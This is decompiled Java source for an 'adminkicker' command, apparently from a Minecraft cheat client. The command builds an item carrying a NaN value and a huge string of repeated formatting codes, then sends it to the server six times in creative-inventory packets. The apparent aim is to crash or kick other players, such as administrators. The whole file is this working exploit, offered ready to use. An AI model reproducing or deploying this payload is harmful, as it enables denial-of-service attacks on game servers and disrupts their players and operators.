// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.commands.impl;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Item;
import me.amkgre.bettercraft.client.commands.Command;

public class AdminKickerCommand extends Command
{
    @Override
    public void execute(final String[] args) {
        if (args.length == 0) {
            final ItemStack itm = new ItemStack(Item.getItemById(122));
            final NBTTagCompound kick = new NBTTagCompound();
            kick.setDouble("adminkicker", Double.NaN);
            String kicked = "";
            for (int i = 0; i < 1200; ++i) {
                kicked = String.valueOf(kicked) + "§c§a    ";
            }
            kick.setString("z", kicked);
            itm.setTagCompound(kick);
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCreativeInventoryAction(36, itm));
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCreativeInventoryAction(36, itm));
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCreativeInventoryAction(36, itm));
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCreativeInventoryAction(36, itm));
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCreativeInventoryAction(36, itm));
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCreativeInventoryAction(36, itm));
        }
    }
    
    @Override
    public String getName() {
        return "adminkicker";
    }
}
